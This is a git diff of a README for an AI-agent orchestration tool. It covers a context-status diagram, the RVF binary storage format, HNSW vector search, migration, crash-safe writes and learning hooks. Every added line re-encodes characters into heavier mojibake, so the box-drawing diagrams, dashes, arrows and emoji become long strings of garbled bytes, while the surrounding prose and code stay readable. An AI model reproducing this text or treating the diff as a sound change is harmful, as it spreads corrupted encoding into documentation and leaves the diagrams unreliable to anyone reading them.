+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Intelligence score (learning.json + patterns + archive)
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Intelligence indicator
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ No prune cycles (ÃƒÂ¢Ã…Â Ã‹Å“) or prune count (ÃƒÂ¢Ã…Â¸Ã‚Â³N)
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Token count (actual API usage)
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Context percentage used
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ Autopilot active (shield icon)
 ```
 
 ### Storage Tiers
@@ -3112,7 +3112,7 @@ CLAUDE_FLOW_AUTO_OPTIMIZE=true            # Importance ranking + pruning + sync
 node .cursor/hooks/context-persistence-hook.mjs status
 
 # Manual compact (archives first, then allows Claude Code to compress)
-# Use /compact in Claude Code Ã¢â‚¬â€ autopilot allows manual, blocks auto
+# Use /compact in Claude Code ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â autopilot allows manual, blocks auto
 
 # Query archive directly
 sqlite3 .claude-flow/data/transcript-archive.db \
@@ -3130,12 +3130,12 @@ sqlite3 .claude-flow/data/transcript-archive.db \
 
 ---
 
-## Ã°Å¸â€™Â¾ Storage: RVF (RuVector Format)
+## ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ Storage: RVF (RuVector Format)
 
-Ruflo uses RVF Ã¢â‚¬â€ a compact binary storage format that replaces the 18MB sql.js WASM dependency with pure TypeScript. No native compilation, no WASM downloads, works everywhere Node.js runs.
+Ruflo uses RVF ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â a compact binary storage format that replaces the 18MB sql.js WASM dependency with pure TypeScript. No native compilation, no WASM downloads, works everywhere Node.js runs.
 
 <details>
-<summary>Ã°Å¸â€™Â¾ <strong>RVF Storage</strong> Ã¢â‚¬â€ Binary format, vector search, migration, and auto-selection</summary>
+<summary>ÃƒÂ°Ã…Â¸Ã¢â‚¬â„¢Ã‚Â¾ <strong>RVF Storage</strong> ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â Binary format, vector search, migration, and auto-selection</summary>
 
 ### Why RVF?
 
@@ -3157,21 +3157,21 @@ RVF files use a simple binary layout: a 4-byte magic header (`RVF\0`), a JSON me
 | `RVF\0` | `0x52564600` | Memory backend | Entries + HNSW index |
 | `RVEC` | `0x52564543` | Embedding cache | Cached vectors with LRU eviction |
 | `RVFL` | `0x5256464C` | Event log | Append-only domain events |
-| `RVLS` | Ã¢â‚¬â€ | Learning store | SONA patterns + trajectories |
+| `RVLS` | ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â | Learning store | SONA patterns + trajectories |
 
 ### Storage auto-selection
 
 You don't need to pick a backend. The `DatabaseProvider` tries each option in order and uses the first one available:
 
 ```
-RVF (pure TypeScript) Ã¢â€ â€™ better-sqlite3 (native) Ã¢â€ â€™ sql.js (WASM) Ã¢â€ â€™ JSON (fallback)
+RVF (pure TypeScript) ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ better-sqlite3 (native) ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ sql.js (WASM) ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ JSON (fallback)
 ```
 
 RVF is always available since it has zero dependencies, so it wins by default. If you have `better-sqlite3` installed (e.g., for advanced queries), it gets priority.
 
 ### Vector search with HnswLite
 
-RVF includes `HnswLite` Ã¢â‚¬â€ a pure TypeScript implementation of the HNSW (Hierarchical Navigable Small World) algorithm for fast nearest-neighbor search. It's used automatically when storing entries with embeddings.
+RVF includes `HnswLite` ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â a pure TypeScript implementation of the HNSW (Hierarchical Navigable Small World) algorithm for fast nearest-neighbor search. It's used automatically when storing entries with embeddings.
 
 ```typescript
 import { RvfBackend } from '@claude-flow/memory';
@@ -3179,14 +3179,14 @@ import { RvfBackend } from '@claude-flow/memory';
 const backend = new RvfBackend({ databasePath: './memory.rvf' });
 await backend.initialize();
 
-// Store entries Ã¢â‚¬â€ embeddings are indexed automatically
+// Store entries ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â embeddings are indexed automatically
 await backend.store({ id: '1', key: 'auth-pattern', content: '...', embedding: vector });
 
 // Search by similarity
 const results = await backend.search({ embedding: queryVector, limit: 10 });
 ```
 
-Supports cosine, dot product, and Euclidean distance metrics. For large datasets (100K+ entries), install `hnswlib-node` for the native implementation Ã¢â‚¬â€ the backend switches automatically.
+Supports cosine, dot product, and Euclidean distance metrics. For large datasets (100K+ entries), install `hnswlib-node` for the native implementation ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â the backend switches automatically.
 
 ### Migrating from older formats
 
@@ -3206,14 +3206,14 @@ await RvfMigrator.fromSqlite('./legacy.db', './memory.rvf');
 await RvfMigrator.toJsonFile('./memory.rvf', './export.json');
 ```
 
-Format detection works by reading the first few bytes of the file Ã¢â‚¬â€ no file extension guessing.
+Format detection works by reading the first few bytes of the file ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â no file extension guessing.
 
 ### Crash safety
 
 All write operations use atomic writes: data goes to a temporary file first, then a single `rename()` call swaps it into place. If the process crashes mid-write, the old file stays intact.
 
-- **Memory backend**: `file.rvf.tmp` Ã¢â€ â€™ `file.rvf`
-- **Embedding cache**: `file.rvec.tmp.{random}` Ã¢â€ â€™ `file.rvec`
+- **Memory backend**: `file.rvf.tmp` ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ `file.rvf`
+- **Embedding cache**: `file.rvec.tmp.{random}` ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ `file.rvec`
 - **Event log**: Append-only (no overwrite needed)
 
 ### SONA learning persistence
@@ -3238,11 +3238,11 @@ await sona.shutdown(); // persists to disk
 
 RVF validates inputs at every boundary:
 
-- **Path validation** Ã¢â‚¬â€ null bytes and traversal attempts are rejected
-- **Header validation** Ã¢â‚¬â€ corrupted files are detected before parsing
-- **Payload limits** Ã¢â‚¬â€ event log entries cap at 100MB to prevent memory exhaustion
-- **Dimension validation** Ã¢â‚¬â€ embedding dimensions must be between 1 and 10,000
-- **Concurrent write protection** Ã¢â‚¬â€ a lock flag prevents overlapping disk flushes
+- **Path validation** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â null bytes and traversal attempts are rejected
+- **Header validation** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â corrupted files are detected before parsing
+- **Payload limits** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â event log entries cap at 100MB to prevent memory exhaustion
+- **Dimension validation** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â embedding dimensions must be between 1 and 10,000
+- **Concurrent write protection** ÃƒÂ¢Ã¢â€šÂ¬Ã¢â‚¬Â a lock flag prevents overlapping disk flushes
 
 ### Configuration
 
@@ -3260,12 +3260,12 @@ ruflo config set memory.backend hybrid
 
 ---
 
-## Ã°Å¸Â§Â  Intelligence & Learning
+## ÃƒÂ°Ã…Â¸Ã‚Â§Ã‚Â  Intelligence & Learning
 
 Self-learning hooks, pattern recognition, and intelligent task routing.
 
 <details>
-<summary>Ã°Å¸ÂªÂ <strong>Hooks, Event Hooks, Workers & Pattern Intelligence</strong></summary>
+<summary>ÃƒÂ°Ã…Â¸Ã‚ÂªÃ‚Â <strong>Hooks, Event Hooks, Workers & Pattern Intelligence</strong></summary>
 
 ### What Are Hooks?
 
@@ -3275,18 +3275,18 @@ Hooks intercept operations (file edits, commands, tasks) and learn from outcomes
 |---------|---------------|-------------------|
 | **Hook** | Code that runs before/after an action | Event listener with pre/post lifecycle |
 | **Pattern** | A learned strategy that worked | Vector embedding stored in ReasoningBank |
-| **Trajectory** | Recording of actions Ã¢â€ â€™ outcomes | RL episode for SONA training |
+| **Trajectory** | Recording of actions ÃƒÂ¢Ã¢â‚¬Â Ã¢â‚¬â„¢ outcomes | RL episode for SONA training |
 | **Routing** | Picking the best agent for a task | MoE-based classifier with learned weights |
 
 ### How Hooks Learn (4-Step Pipeline)
 
 ```
-Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â    Ã¢â€Å’Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Â
-Ã¢â€â€š  RETRIEVE   Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š    JUDGE    Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š   DISTILL   Ã¢â€â€šÃ¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€“Â¶Ã¢â€â€š CONSOLIDATE Ã¢â€â€š
-Ã¢â€â€š             Ã¢â€â€š    Ã¢â€â€š             Ã¢â€â€š    Ã¢â€â€š             Ã¢â€â€š    Ã¢â€â€š             Ã¢â€â€š
-Ã¢â€â€š Find similarÃ¢â€â€š    Ã¢â€â€š Was it      Ã¢â€â€š    Ã¢â€â€š Extract key Ã¢â€â€š    Ã¢â€â€š Prevent     Ã¢â€â€š
-Ã¢â€â€š past patternsÃ¢â€â€š   Ã¢â€â€š successful? Ã¢â€â€š    Ã¢â€â€š learnings   Ã¢â€â€š    Ã¢â€â€š forgetting  Ã¢â€â€š
-Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€Ëœ
+ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â    ÃƒÂ¢Ã¢â‚¬ÂÃ…â€™ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‚Â
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡  RETRIEVE   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    JUDGE    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   DISTILL   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬â€œÃ‚Â¶ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ CONSOLIDATE ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡             ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Find similarÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Was it      ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Extract key ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ Prevent     ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ past patternsÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ successful? ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ learnings   ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡ forgetting  ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬Å¡
+ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    ÃƒÂ¢Ã¢â‚¬ÂÃ¢â‚¬ÂÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ¢â€šÂ¬ÃƒÂ¢Ã¢â‚¬ÂÃ‹Å“    